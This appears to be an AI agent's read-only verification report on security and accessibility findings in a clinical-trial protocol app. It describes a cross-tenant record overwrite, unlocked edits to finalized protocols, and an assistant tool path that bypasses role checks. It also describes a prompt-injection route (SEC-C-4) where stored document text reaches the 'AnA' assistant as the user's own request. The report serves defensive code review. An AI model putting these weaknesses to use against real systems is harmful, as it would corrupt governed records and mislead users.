- `server/routes/protocol-soa.ts:1-102` — full file. `governed()` (45-57) runs `BEGIN → setTenantContextTx → run() → recordGovernedAction → COMMIT` with no status check anywhere in the request path for `POST /documents/:id/assessments` (60-70), `POST /cells` (73-81), `POST /cells/clear` (84-91).
- `server/services/protocol-development/protocol-development-service.ts:88-90` — confirms `assertEditable(status)` exists and throws `INVALID_STATE` for `finalized`/`superseded`. Read 240-317: `addObjectiveTx` (250), `addEligibilityCriterionTx` (262), `addVisitTx` (273), `updateVisitTx` (283), `removeVisitTx` (298) and `removeSoaAssessmentTx` (310) **all** call `assertEditable(doc.status)` first — confirming the lock exists and is applied everywhere in the sibling file except the SoA add/cell writers, which live in a different file and skip it entirely.
- `migrations/20260701_protocol_soa.sql` — grepped for `trigger|function`: no hits. `grep -rl "protocol_soa_assessments\|protocol_soa_cells" migrations/ db/migrations/` returns only this one file. No DB-level backstop exists.
- `server/services/part11/signature-persistence.ts:583-608` — the finalize-signature digest explicitly selects from `protocol_soa_assessments` (600) and `protocol_soa_cells` (601) and its own note (607) states: *"sha256 over the protocol's content at signing time: … ${content.assessments.length} SoA assessment(s) and ${content.cells.length} cell(s) … No version, workflow status or timestamp is bound."* So the exact content that can still be freely mutated is the exact content the signature is supposed to seal.
- `server/services/protocol-development/protocol-development-service.ts:383-386` (`finalizeProtocolTx`) and `358-369` (`snapshotVersionTx`) — the `protocol_versions.snapshot` is `JSON.stringify({ version, sections: sections.rows })` in both places. Sections only; no assessments/cells. The version table genuinely cannot show what the schedule was when signed.
- `server/services/protocol-development/pdev-view-assembler.ts:384-393` (`assembleOrgPdevDocs`) — `SELECT … status … FROM protocol_documents WHERE organization_id = $1 AND deleted_at IS NULL`, no status filter; finalized documents are returned to the read model exactly as before.
- `client/src/concept2cure/v2/surfaces/ProtocolDevWorkspace.tsx:117-149` — `ProtocolHeader` renders `<PG.StatusBadge status={str(doc.status)} />` (130) and the version string (139) unconditionally; `canWrite` (318) is `Number.isInteger(numericDocId) && numericDocId > 0` — no reference to `doc.status` anywhere in the file (grepped).
- `client/src/concept2cure/v2/surfaces/ProtocolDevSoa.tsx` — grepped for `status`: zero hits. `editable` (243) is `Boolean(canWrite) && reason.trim().length >= MIN_REASON`; "Add assessment" (246-251) is shown whenever `onEdit && canWrite`. Neither depends on lifecycle state.
- `client/src/concept2cure/v2/surfaces/ProtocolGov.tsx:65-69` (`StatusBadge`) — a plain string→tone lookup, no drift/digest awareness.
- `server/bootstrap/register-inline-routes.ts:728-730` — the only middleware ahead of the router is `authMiddleware` (authentication only).
- **Second door, confirmed:** `server/services/ana/AnaToolExecutor.ts:10700-10714` — the AnA tools `add_soa_assessment`-class handler and `set_soa_cell` both import and call `addAssessmentTx`/`setCellTx` from the same unguarded service file, so the AnA path is exposed to the identical gap; a service-layer fix closes both doors, a route-only fix would not.

**Why (10ad41a2's effect on this finding):**
`git show 10ad41a2` adds `router.use(requireEditorAccessForWrites)` to `protocol-soa.ts:18-22` (and nine sibling routers) and a new `requireEditorAccessForWrites` in `server/middleware/orgMembership.ts:549-560`, which is `requireEditorAccess` for any non-GET/HEAD/OPTIONS method. `requireEditorAccess` (`orgMembership.ts:526-541`) refuses only the `viewer` role; `GOVERNED_WRITE_ROLES` (`orgMembership.ts:501-508`) admits `admin, manager, member, owner, super_admin` — and the same file's own comment records that `member` is "what SSO provisioning assigns," i.e. the default role for most org users. This closes **SEC-C-1** for this route (a viewer is now 403'd before reaching `addAssessmentTx`/`setCellTx`/`clearCellTx`), but it is a **role check, not a lifecycle-state check**, and SEC-C-2 is specifically that the state check (`assertEditable`) is absent. Nothing in the diff touches `protocol-soa-service.ts`, adds a status read, or restricts the client grid. So after `10ad41a2`:
- A **viewer** can no longer reach these three routes (narrowed from the pre-fix state, where SEC-C-1 and SEC-C-2 stacked so a viewer alone could do this).
- Any **member** (or manager/admin) — the ordinary working role for almost every real user in the org — can still add assessments and set/clear cells on a `finalized` or `superseded` protocol, with the client showing no warning and the header still reading "Finalized."

SEC-C-2 is **not touched, closed, or narrowed in severity** by `10ad41a2`; only the set of roles that can trigger it shrank from "any authenticated org member" to "any org member who is not a viewer," which for this product is effectively everyone who does real work.

**If confirmed, the smallest correct fix:** exactly as the report states — add `loadDoc(client, orgId, docId)` + `assertEditable(doc.status)` inside `addAssessmentTx`, `setCellTx` (resolve `protocol_document_id` from the assessment row it already fetches at `protocol-soa-service.ts:40-42` and check status there) and `clearCellTx` (which currently does no document lookup at all — line 56-59 — so it needs one added), matching the pattern already used at `protocol-development-service.ts:250, 273, 298, 310`. Doing it in the service (not just the route) also closes the AnA second door (`AnaToolExecutor.ts:10700-10714`) for free. On the client, gate `editable`/"Add assessment" in `ProtocolDevSoa.tsx` on `doc.status` too, matching the report's proposed fix — I found nothing wrong or incomplete in the report's proposed fix. One addition worth flagging for the fix author: `snapshotVersionTx`/`finalizeProtocolTx` snapshots (`protocol-development-service.ts:358-369, 375-386`) should probably also start capturing assessments/cells once the write path is locked, or the version table will keep being unable to show what the schedule was at signing — the report notes this but doesn't fold it into its "smallest fix," which is reasonable since it's a separate (larger) change.

**Gate/other notes:** I did not re-run any `npm run ci:*` gates myself for this narrow verification (the report already ran `ci:tenant-isolation:no-regression`, `ci:unauthenticated-fetch`, `ci:sign-ceremony`, none of which target this defect class — no gate here checks that a governed-write function honors document lifecycle state). I did not execute the code path against a running server or database; the confirmation is by direct code reading of every cited line plus the surrounding callers/guards, per the verification brief's method, and I found no guard — router-level, service-level, DB-trigger, or client-level — that the lens missed.

---

## Verification of SEC-C-3
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high — a cross-tenant weakness: another organisation's session can permanently block, or (with RLS not enforcing) silently overwrite, a governed budget/feasibility record it does not own; it does not itself falsify a signed/released governed state, so it does not meet "blocker."
**What I checked:** At HEAD `10ad41a2` (branch `concept2cure-v2`; working-tree edits to `ProtocolDev.tsx` and its test, ignored per instruction):
- `server/routes/protocol-budget.ts:1-94`, incl. the new `router.use(requireEditorAccessForWrites)` at line 22 and `PUT /documents/:id/params` at 74-84.
- `server/services/protocol-budget/protocol-budget-service.ts:40-53` (`setBudgetParamsTx`) and 29-38 (`addBudgetItemTx`), 55-72 (`getBudgetSummary`).
- `migrations/20260702_protocol_budget.sql:13-43` (table defs, unique index).
- `server/middleware/orgMembership.ts:531-547` (`requireEditorAccess`) and `:549-570` (`requireEditorAccessForWrites`), and the `git show 10ad41a2 -- server/middleware/orgMembership.ts` / `-- server/routes/protocol-budget.ts` diffs.
- `db/migrations/20260801_tenant_isolation_sweep.sql:1-260` (allowlist at ~70-77, the generic per-table policy loop at ~86-155).
- `scripts/db/migration-set.mjs:2291` (protocol_budget migration position) and `:2670-2679` (`TENANT_ISOLATION_SWEEP` is the last entry).
- `scripts/ci/check-tenant-isolation.mjs:88-166` (`TENANT_SCOPED_TABLES`), and ran `npm run --silent ci:tenant-isolation:no-regression`.
- `server/services/ana/AnaToolExecutor.ts:10668-10676` (`set_protocol_budget_params` AnA handler).

**Why:**
- The write path is exactly as reported. `protocol-budget.ts:74-84` takes `id = Number(req.params.id)` from the path and passes it straight to `setBudgetParamsTx(client, orgId, userId, id, …)`, where `orgId` is the *caller's own* session org (`resolveOrgId`, `protocol-budget.ts:30-35`) — never checked against the document's owner.
- `protocol-budget-service.ts:40-53` does:
  ```
  INSERT INTO protocol_budget_params (organization_id, protocol_document_id, …)
  VALUES ($1,$2,…)
  ON CONFLICT (protocol_document_id) DO UPDATE SET …
  ```
  with no `SELECT … FROM protocol_documents WHERE id=$1 AND organization_id=$2` anywhere in the function or its caller. `addBudgetItemTx` (`:29-38`) has the identical shape (this is also SEC-C-8's pattern, on the same table family).
- `migrations/20260702_protocol_budget.sql:43`: `CREATE UNIQUE INDEX IF NOT EXISTS uq_protocol_budget_params_doc ON protocol_budget_params(protocol_document_id);` — the conflict target is the document id *alone*, not `(organization_id, protocol_document_id)`, so any org's session can name any document id and collide with another org's row.
- **RLS is real on this table**, but only through the generic sweep, not a hand-written policy for this table: no other file mentions `protocol_budget` (`grep -rl protocol_budget migrations/ db/migrations/` returns only the creating migration). `protocol_budget_params`/`protocol_budget_items` carry `organization_id integer NOT NULL`, are ordinary `public` base tables, and are not in the sweep's allowlist (`organization_users, __drizzle_migrations, stripe_events, billing_budgets, billing_alerts, api_keys` — `20260801_tenant_isolation_sweep.sql` allowlist block). The sweep's `FOR ALL … USING/WITH CHECK` policy therefore attaches to both tables automatically, and the sweep is provably last in the applied set (`migration-set.mjs:2291` vs `:2670-2679`), so on any database built from `C2C_MIGRATION_FILES` the policy is present before production traffic runs. That corroborates the PGlite repro's cases 1-2 (an `UPDATE` from the wrong org fails the policy's `WITH CHECK`/`USING`, permanently refusing the owner's own later write since the row is now claimed) and case 3 (shadow mode admits the cross-tenant overwrite). I did not run this against a provisioned RDS instance or confirm the live API connection's role/`app.rls_enforce` setting — that remains unverified by reading alone, same limit the original report already flagged.
- **The gate is blind to this table**, confirmed by running it: `ci:tenant-isolation:no-regression` → "8 candidate(s) … 8 current, 8 baseline" — no `protocol_budget_*` table appears in `TENANT_SCOPED_TABLES` (`check-tenant-isolation.mjs:88-166`), and even a listed table wouldn't be flagged here because the INSERT literally contains the string `organization_id`, which the heuristic treats as safe regardless of whether it constrains the *conflicting* row.
- **10ad41a2 does not touch this.** It adds `router.use(requireEditorAccessForWrites)` to `protocol-budget.ts:22` (confirmed in the commit diff and in the file at HEAD). `requireEditorAccessForWrites` (`orgMembership.ts:559-570`) is a pass-through for GET/HEAD/OPTIONS and otherwise calls `requireEditorAccess` (`orgMembership.ts:531-547`), which checks (a) `req.userRole` is in `{admin, manager, member, owner, super_admin}` — i.e., not `viewer` — and (b) that a numeric org id resolves from the session. It never reads `req.params.id`, never queries `protocol_documents`, and sets nothing but `req.resolvedOrganizationId` (the caller's own org). It answers "does this caller hold a writing role in *some* org," not "does this caller's org own *this* document." Since `member` — the SSO/default role — is in `GOVERNED_WRITE_ROLES`, the change excludes only `viewer` accounts from this exploit path; any ordinary authenticated non-viewer member of another tenant can still reach `PUT /documents/:id/params` with a foreign `id` exactly as before. The finding is a tenant-provenance defect (Rule 3 in this review's checklist: "org id comes from the session, never from a path param without a guard on ownership of the resource the param names") and 10ad41a2 is a role/Rule-1-of-the-checklist fix ("second doors"/role gate), an orthogonal control.
- **Second door still open.** `AnaToolExecutor.ts:10668-10676` (`set_protocol_budget_params`) calls the same `setBudgetParamsTx` with a model/AnA-supplied `document_id` and `ctx.organizationId` — unaffected by 10ad41a2, which only touched HTTP routers.

**If confirmed, the smallest correct fix:** Before the upsert, prove the document belongs to the caller's org — `SELECT 1 FROM protocol_documents WHERE id=$1 AND organization_id=$2` (the repo's own `loadDoc` pattern, already used by `study-design-repository.ts`) — and refuse (404/403) if it does not, in both `setBudgetParamsTx`/`addBudgetItemTx` and the AnA handler. Re-key the unique index to `(organization_id, protocol_document_id)` by amending `migrations/20260702_protocol_budget.sql` in place with a dated note (CLAUDE.md Rule 1 — not a new migration with a DROP), and change the `ON CONFLICT` target to match. Add `protocol_budget_params`/`protocol_budget_items` (and the sibling tables from SEC-C-8) to `TENANT_SCOPED_TABLES`, understanding that doing so alone catches nothing here since the statement already contains the keyword the gate checks for — the gate's heuristic itself needs to require the keyword to appear in a `WHERE`/`ON CONFLICT`-scoping position tied to the row being mutated, not just anywhere in the statement. The report's proposed fix is correct and complete as stated; I found nothing to add or correct in it beyond noting that `requireEditorAccessForWrites` (10ad41a2), while a genuine and correctly-implemented fix for SEC-C-1's role gap, is not a fix for SEC-C-3 and should not be read as narrowing it beyond excluding `viewer` accounts specifically.

---

## Verification of SEC-C-4 to SEC-C-7

---

**SEC-C-4 — stored document text reaches AnA as the user's own request**

**Verdict:** CONFIRMED

**Severity, as you would grade it:** high (report said medium) — this is a genuine prompt-injection weakness, and the rubric names "a cross-tenant or injection weakness" as high, not medium. It fires on ordinary button presses every time, not on a narrow trigger, so "medium: a real defect with a workaround or narrow trigger" undersells it.

**What I checked:** `ProtocolDevWorkspace.tsx:141-144`, `ProtocolDev.tsx:139-160`, `ProtocolDevSection.tsx:233-239`, `RichSectionEditor.tsx:1308-1314`, `V2App.tsx:1042-1051`, `server/services/ana-ri/surface-context-block.ts:1-33`, `server/routes/ana-ri/stream.ts:460-473`, `server/services/ana/ana-input-guard.ts:17-80`, `client/src/concept2cure/v2/shellProject.ts:211-219`, `server/routes/protocol-development.ts:171-183, 229-236`, plus a repo-wide grep for `PROMPT_INJECTION_ENFORCE`/`PROMPT_INJECTION_ENCAPSULATE` across `.tf`/`.yml`/`.ts`.

**Why:** All four sites build a string from stored data and hand it to `onAsk`:
- `ProtocolDevWorkspace.tsx:141-142`: `onClick={() => onAsk('Review ' + str(doc.shortTitle) + ' for completeness and list what blocks finalization.')}` — `shortTitle` is `protocol_number`, settable free text up to 120 chars by any writing-role member (`protocol-development.ts:173` create, `:229-236` cover-page patch).
- `ProtocolDevSection.tsx:236`: `onAsk('Draft ' + (sec.title ?? 'this section') + ' for ' + (shortTitle ?? 'this protocol') + ' from the linked evidence.')` — section titles come from org templates.
- `ProtocolDev.tsx:143-145,160`: the empty-state prompt splices in `shellProgramName()` (`shellProject.ts:211-219`), which reads `p.product`, `p.code` or `p.title` — user-set project fields.
- `RichSectionEditor.tsx:1308-1314`: `askForSource` sends `Suggest a source for this claim: "${s}"` with the editor's current selection verbatim.

All four reach `ask()` in `V2App.tsx:1042-1051`, which does `void anaChat.send(clean, files)` — no tagging, no separate field, sent exactly like the user's own typed turn. Contrast `surface-context-block.ts:17-33`, which explicitly fences `module_context` because "this payload is UNTRUSTED... Treating it as trusted would make it a prompt-injection channel" — these four paths route stored strings around that exact fence. Server-side, `stream.ts:469-473` confirms detection is observe-only by default: "hard-block and content encapsulation are opt-in via PROMPT_INJECTION_ENFORCE / PROMPT_INJECTION_ENCAPSULATE (both default OFF)". I grepped `terraform/`, `.github/workflows/`, and the whole tree for those two variable names outside test files and `ana-input-guard.ts`/`stream.ts` themselves — no hits, so production runs with both off, exactly as the report states.

**10ad41a2's effect:** none on the defect itself. That commit only touches `server/middleware/orgMembership.ts` and ten `server/routes/protocol-*.ts` files (confirmed via `git show --stat`); it adds a router-level `requireEditorAccessForWrites` gate to the routes that let a member set `protocol_number`, section titles (templates) and so on. Since `GOVERNED_WRITE_ROLES` includes `member` (`orgMembership.ts:503-511`, and its own comment notes `member` is what SSO provisioning assigns by default), the population that can plant the injected text narrows only from "any authenticated org member, including a viewer" to "any member holding a writing role" — in practice almost no narrowing, since `member` is the default role. Nothing in 10ad41a2 touches the client prompt-construction sites, `V2App.tsx`, `surface-context-block.ts`, or the injection-guard env defaults.

**If confirmed, the smallest correct fix:** as the report states — stop splicing stored strings into the user's chat turn; phrase the prompt without the value ("the protocol open on screen") and let the server resolve it from the fenced `module_context`, or send the editor selection through the same fencing path as `module_context`. I did not find anything wrong or incomplete in the report's proposed fix. One addition: since this is genuinely high, not medium, I would also recommend defaulting `PROMPT_INJECTION_ENCAPSULATE=true` in production rather than leaving it opt-in, as a defense-in-depth measure independent of fixing these four call sites.

---

**SEC-C-5 — the AnA section write records a reason nobody gave**

**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium, as reported — a real defect confined to the audit-trail reason field of an otherwise-attributable, human-confirmed write; it doesn't itself misrepresent governed content or state.

**What I checked:** `ProtocolDevSection.tsx:233-239`, `server/services/ana/notifications-study-memory-tool-defs.ts:392-400`, `server/services/ana/AnaToolExecutor.ts:11508-11524` and `:10031-10034`, `server/routes/ana-ri/utility.ts:221-241` and `:580-605`, `server/routes/protocol-development.ts:92-94, 357-362` (the HTTP twin), and a grep of `AnaToolExecutor.ts` for any `role` field on `ctx`.

**Why:** The tool schema makes `reason` optional (`notifications-study-memory-tool-defs.ts:397-398`, `required: ['section_id']`). The handler (`AnaToolExecutor.ts:11507-11524`) calls `recordGovernedAction(..., reason: fcoiReason(input, 'Protocol section edited via AnA'), ...)`. `fcoiReason` (`:10031-10034`):
```
const FCOI_REASON_MIN = 8;
function fcoiReason(input, fallback) {
  const r = typeof input.reason === 'string' ? input.reason.trim() : '';
  return r.length >= FCOI_REASON_MIN ? r : fallback;
}
```
so the recorded reason is either the model's own text or a fixed sentence that reads like a real one — never something the human typed. The confirm path (`ana-ri/utility.ts:592-596`) only checks `body.confirm === true` for a `confirm`-tier tool; `runConfirmedTool` (`:221-241`) passes `humanConfirmed: true` but no reason and no role. Contrast the HTTP twin at `protocol-development.ts:93` (`const reason = z.string().trim().min(8, ...)`) and `:357` (`sectionSchema` requires it) — that route refuses a sub-8-character reason outright; the AnA tool substitutes instead.

**10ad41a2's effect:** none, and this is worth stating plainly — `update_protocol_section` (AnA) never goes through `server/routes/protocol-development.ts` at all. The handler imports `updateSectionTx` directly from `protocol-development-service.js` (`AnaToolExecutor.ts:11511-11516`) and runs it against a raw pool client, bypassing the router — and therefore bypassing the new `requireEditorAccessForWrites` gate — entirely. I grepped `AnaToolExecutor.ts` for `role` on `ctx.*`; the only hit is an unrelated reviewer `role` field (`:10988`). So even after 10ad41a2, a caller with no writing role reaching this tool would not be refused by the new gate, because that gate is never in this path's call graph. 10ad41a2's diff (`server/middleware/orgMembership.ts` + ten route files, per `git show --stat`) confirms it touches no AnA file.

**If confirmed, the smallest correct fix:** as reported — make `reason` required in the tool schema and refuse (not substitute) under 8 characters; better, have the confirmation step collect the human's own reason for governed-content tools and pass it through. I'd add: since this path is also a second door around the router-level role gate the codebase just built for the HTTP side, the same review should carry a role check into `ToolContext` for this and sibling protocol-write tools (this is the same shape as SEC-C-1's "AnA door" note, not newly introduced by 10ad41a2, but not closed by it either).

---

**SEC-C-6 — unsaved protocol text outlives the session and is offered to the next person**

**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium, as reported — real defect, but requires a shared/handed-over browser profile plus the next user's affirmative click on "Restore the device draft"; a narrow trigger in the rubric's sense.

**What I checked:** `client/src/concept2cure/v2/surfaces/ProtocolDevSection.tsx:176`, `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:325, 1082-1101, 1871-1881`, `client/src/services/portal/authService.tsx:125-181 (AUTH_STORAGE_KEYS, LEGACY_BEARER_KEYS, SecureStorage.clear), :986-994 (clearAuth)`, and a repo-wide grep for `dc::` in `client/src`.

**Why:**
- `ProtocolDevSection.tsx:176`: `storageKey={writable ? \`pdev-section-${sec.id}\` : null}` — keyed only by section id, no user or org.
- `RichSectionEditor.tsx:325`: `cacheKeyFor = (storageKey) => 'dc::' + storageKey`.
- `:1082-1093` writes every unsaved keystroke to `localStorage` under that key; `:1094-1101` offers it back on mount whenever it differs from the loaded section, unconditionally of who is logged in now.
- `:1871-1881`: the offer UI says only "A draft cached on this device differs from the saved section." with "Restore the device draft" / "Discard it" — no author, no timestamp.
- `authService.tsx:137-143` defines `AUTH_STORAGE_KEYS` (five keys, none `dc::*`); `SecureStorage.clear()` (`:162-181`) iterates only those plus `LEGACY_BEARER_KEYS`; `clearAuth()` (`:986-994`) calls `SecureStorage.clear()` and nothing else. I grepped all of `client/src` for `dc::` and found no clearing site anywhere — only the two comments in `DocumentWorkbench.tsx` describing the same cache and the two test files that assert it persists.

This fully matches the report's claim: logout does not clear the device draft cache, and the offer identifies neither the author nor the time.

**10ad41a2's effect:** none on the storage/clear/offer mechanism itself — that commit touches no client file. It does narrow, marginally, who can complete the misattribution: the section-save route (`protocol-development.ts` `PATCH /sections/:id`) is now behind `requireEditorAccessForWrites`, so a viewer specifically can no longer restore-and-save a stale draft under their name. Since `member` (the default role) is still a writing role, any ordinary next user on that browser can still do exactly what the report describes.

**If confirmed, the smallest correct fix:** as reported — key the cache by user and org, delete `dc::` entries in `SecureStorage.clear()`, and name the cache's author/time in the restore offer. I found nothing wrong with this proposed fix. I'd add: the same cache is used by every surface built on `RichSectionEditor`, not just ProtocolDev, so the fix belongs in the shared editor/auth code (`RichSectionEditor.tsx` + `authService.tsx`), not per-surface.

---

**SEC-C-7 — a signed disposition is displayed under a label, not under the signer**

**Verdict:** CONFIRMED

**Severity, as you would grade it:** high (report said medium) — the rubric's "high" bucket is "the person can be materially misled about governed content or its state." A reviewed/approved protocol's Reviews pane and its own signing dialog can display a name that is not the actual signer's, for a 21 CFR 11.50(a)(1) record whose entire purpose is showing who approved what. That is squarely a misrepresentation of governed content to the reader, even though the underlying `electronic_signatures` row is correct — the pane is the read surface people actually use.

**What I checked:** `client/src/concept2cure/v2/surfaces/ProtocolDevForms.tsx:159-160, 305-309, 379-383`; `server/routes/protocol-reviews.ts:99-114`; `server/services/protocol-reviews/protocol-reviews-service.ts:41-81`; `server/services/protocol-development/pdev-view-assembler.ts:63`; `client/src/concept2cure/v2/surfaces/ProtocolDevReviews.tsx:39-55`; `client/src/concept2cure/v2/surfaces/ProtocolDevSigning.tsx:60-78`; `server/services/part11/signature-persistence.ts:320` (for the correct-name source of truth); and `AnaToolExecutor.ts:11025-11038` for the AnA second door.

**Why:** The form (`ProtocolDevForms.tsx:159-160`) has two independent fields, "Reviewer account" (`reviewerUserId`) and "Reviewer name" (`reviewerName`, free text). The auto-fill (`:379-383`) only copies the account's name into `reviewerName` when that field is *blank* — a caller can select account B and type a different name, and it is kept as-is. The server (`protocol-reviews.ts:99-105`, `reviewerSchema`) and service (`protocol-reviews-service.ts:57, 75-79`, `INSERT ... reviewer_name ...`) store exactly what was submitted; the only validation is that a supplied `reviewerUserId` is a member who holds a writing role (`:60-74`) — nothing compares `reviewerName` to that account's actual name. The read model (`pdev-view-assembler.ts:63`: `reviewer: str(rv.reviewer_name)`) and both display sites — `ProtocolDevReviews.tsx:40,49`: `const name = str(r.reviewer); ... <span>{name || 'Unnamed reviewer'}</span>` and `ProtocolDevSigning.tsx:73`: `target: \`${signing.reviewer || 'Reviewer'} · ${protocol}\`` — show that free-text label, not a name resolved from the account or the signature row. `signature-persistence.ts:320` shows the `electronic_signatures` table does carry its own `signer_name` column separately, so the correct printed name exists in the database and is simply not what these two panes read from.

**10ad41a2's effect:** partial and narrow. `protocol-reviews.ts` is one of the ten routers 10ad41a2 gates with `router.use(requireEditorAccessForWrites)` (confirmed in the commit's diff), so `POST /api/protocol-reviews/documents/:id/reviewers` — the route that creates a mismatched-name assignment — now refuses a viewer, closing the overlap the original report itself flagged ("Whoever creates the assignment (any member, or a viewer per SEC-C-1)…"). It does not close the finding: `member` remains a writing role and can still create the mismatch; the disposition-signing route already had `requireEditorAccess` before this commit (it was one of the "two signing routes" SEC-C-1 describes), so nothing changes there; and the display defect at `pdev-view-assembler.ts:63` / `ProtocolDevReviews.tsx` / `ProtocolDevSigning.tsx` is untouched. I also checked the AnA second door, `assign_protocol_reviewer` (`AnaToolExecutor.ts:11025-11038`): it calls `assignReviewerTx` directly with a model-supplied `reviewer_name`/`reviewer_user_id` pair, bypassing `protocol-reviews.ts` (and 10ad41a2's new gate on it) entirely — the same second-door shape as SEC-C-5, and it remains fully open after 10ad41a2.

**If confirmed, the smallest correct fix:** as reported — for an account-bound assignment, resolve and store the account's own name server-side and refuse a conflicting free-text name; show the signer's printed name from the signature row next to a signed disposition, not `reviewer_name`. I'd add that the fix needs to also close the AnA tool door (`assign_protocol_reviewer`), since it writes the same table through the same defect independent of the HTTP route's validation.

---

### Summary

| id | report's severity | my verdict | my severity | 10ad41a2 effect |
|---|---|---|---|---|
| SEC-C-4 | medium | CONFIRMED | high | none — commit touches no client/AnA file; narrows only viewer→member, and member is default |
| SEC-C-5 | medium | CONFIRMED | medium | none — AnA tool path bypasses the router the commit gates entirely (`ctx` carries no role) |
| SEC-C-6 | medium | CONFIRMED | medium | none on storage/clear/offer; marginally narrows the "next user" (excludes viewer only) |
| SEC-C-7 | medium | CONFIRMED | high | partial — closes the viewer-can-create-mismatch overlap with SEC-C-1; display defect and AnA second door (`assign_protocol_reviewer`) untouched |

Files I read to reach these verdicts (all read-only, no edits): `client/src/concept2cure/v2/surfaces/ProtocolDevWorkspace.tsx`, `ProtocolDev.tsx`, `ProtocolDevSection.tsx`, `ProtocolDevForms.tsx`, `ProtocolDevReviews.tsx`, `ProtocolDevSigning.tsx`; `client/src/concept2cure/v2/editor/RichSectionEditor.tsx`; `client/src/concept2cure/v2/shellProject.ts`; `client/src/concept2cure/v2/V2App.tsx`; `client/src/services/portal/authService.tsx`; `server/routes/protocol-development.ts`, `protocol-reviews.ts`; `server/services/protocol-reviews/protocol-reviews-service.ts`; `server/services/protocol-development/pdev-view-assembler.ts`; `server/services/ana/AnaToolExecutor.ts`, `notifications-study-memory-tool-defs.ts`; `server/routes/ana-ri/utility.ts`, `stream.ts`; `server/services/ana-ri/surface-context-block.ts`; `server/services/ana/ana-input-guard.ts`; `server/services/part11/signature-persistence.ts`; `server/middleware/orgMembership.ts`; and the full diff of commit `10ad41a2` (`git show --stat` and per-file diffs for `orgMembership.ts`, `protocol-development.ts`, `protocol-reviews.ts`).

---

## Verification of A-A-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. The Part 11 reason field has no programmatic required or invalid state and no lasting instruction, but the server refuses a short reason (`server/routes/authoring.router.ts:1809-1811`) and ⌘S from the canvas explains the refusal. The record is never wrong.
**What I checked:** `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:648-687` (reason state), `1976-1994` (the save funnel), `3296-3327` (the input and Save), `3785` (where the editor mounts); `RichSectionEditor.tsx:1480-1492, 1830` (the ⌘S binding); `toast.tsx:145`; `shared/constants/governed-reason.ts:10`; `surfaces/filingTarget.tsx:355-378` (the sibling field, already fixed). I searched all of `client/src` for another ⌘S binding and found none. HEAD is `185bbbb0e`, and `git diff 7087f46e2 HEAD` changes none of the cited files.
**Why:** The input has only `placeholder="Why this changed (at least 8 characters)"` (3307) and `aria-label="Reason for change"` (3308). It has no `aria-required`, `aria-describedby` or `aria-invalid`, and no visible label once typing starts. The rule is stated in two other places, and neither is shown before the person needs it:
- The Save button's `title` (3320-3321) is on a button that is `disabled={!dirty || saving || docSealed || changeReason.trim().length < 8}` (3316). It shows only on mouse hover, and Tab skips the button.
- The funnel toast (`role="alert"`, 1987-1992) only fires through the editor's own save.

The report marked the ⌘S route as "not verified". It does not work from this field. ⌘S is bound by `onKeyDown` on `.rse-root` (`RichSectionEditor.tsx:1482-1484, 1830`). The reason input is in the header (3302), outside that element; the editor mounts at 3785. So ⌘S typed in the reason field opens the browser's own "Save page" dialog, not the explanation.
**If confirmed, the smallest correct fix:** The report's fix is right:
- add `aria-required="true"`;
- add `aria-invalid` when 0 < trimmed length < `GOVERNED_REASON_MIN`;
- add a visible note that stays on screen, linked by `aria-describedby`, in the same shape as `filingTarget.tsx:371-378`;
- import `GOVERNED_REASON_MIN` instead of the literal `8` at 1987, 3316 and 3320.

It misses one thing: Save's own disabled reason (3316-3323) uses the same title-only pattern as A-A-3, and the new note should replace it.

## Verification of A-A-2
**Verdict:** CONFIRMED (the behaviour is as described; the report's alternative fixes would not work)
**Severity, as you would grade it:** medium. Whenever the AnA pane is open, which it is by default, pressing Escape to close a `useDialog` dialog also closes the pane. One click brings it back, nothing is lost, and nothing governed is affected.
**What I checked:**
- `DocumentWorkbench.tsx:730` (default rail), `1023-1054`, `1094-1118` (the AnA Escape listener and its focus effect), `3397`, `3554-3557`, `4997-5043`, `5055-5134`.
- `useDialog.ts:50-101`.
- `FileToVaultDialog.tsx:159,194`; `AssignReviewDialog.tsx:241,284`; `AuthoringPlaceIntoFiling.tsx:162,331-337`; `EsignModal.tsx:258-286`; `RichSectionEditor.tsx:2170-2175`.
- Where a guard could be: `closeOnEscape` checks only `event.key`, and nothing else stops it.
**Why:** Both listeners are on the same target in the bubble phase: `document.addEventListener('keydown', closeOnEscape);` (1101) and `document.addEventListener('keydown', onKey);` (`useDialog.ts:94`).

Registration order decides which runs first. The rail starts open (`>(embedded ? null : 'ana');`, 730), so `closeOnEscape` is registered when the page mounts. Each dialog registers later, when it opens. Listeners on the same target run in the order they were registered, so `closeAna()` (1099) runs before useDialog's `e.stopPropagation(); closeRef.current();` (`useDialog.ts:60-61`).

This means both of the report's alternative fixes fail:
- Switching useDialog to `stopImmediatePropagation` changes nothing, because the AnA listener has already run.
- Moving the AnA listener to the capture phase, as the report words it, makes it run even earlier.

There are four such dialogs, not three. The fourth is AuthoringPlaceIntoFiling (`useDialog(() => { if (!placing) setOpen(false); }, open)`, :162), mounted from this file at 3397. EsignModal is not affected, because it uses capture plus `stopPropagation` (`EsignModal.tsx:262,285`).

There is one aggravating edge case. When a dialog's Escape is blocked because it is busy (filing or placing), the dialog stays open, AnA still closes, and the close effect (1113-1115) moves focus to the AnA opener, which sits outside the `aria-modal` panel.
**If confirmed, the smallest correct fix:** At the top of `closeOnEscape`, add `if (event.defaultPrevented || document.querySelector('[aria-modal="true"]')) return;`. All four panels declare `aria-modal="true"`. The `defaultPrevented` check also stops the Rename group's Escape (3554-3557) from closing AnA. The report's flag guard (`pendingLeave || fileToVaultOpen || assignReviewOpen`) misses the placement dialog, whose open state lives inside that child. Moving `useDialog` to the capture phase would work, but it would pre-empt React Escape handlers inside all 36 of its dialogs, so it is not a small change.

## Verification of A-A-3
**Verdict:** PARTLY CONFIRMED
**Severity, as you would grade it:** low. The pattern is real on all four buttons. But three are disabled because the document is frozen, which the page already says in visible text, and no WCAG success criterion requires a disabled control to explain itself.
**What I checked:** `DocumentWorkbench.tsx:869-871` (`docSealed`), `3278-3294`, `3312-3338`, `3346-3371`, `4278-4286`; the text that explains the state elsewhere, at `3326`, `3458`, `3667-3671` and `3747-3754`.
**Why:** All four are as quoted: `disabled={dirty}` plus a title (3283-3290); `disabled={docSealed}` plus a title (3332-3335); `disabled={!activeSection || docSealed}` plus a title (3362-3368); `disabled={docSealed}` plus a title (4282-4283).

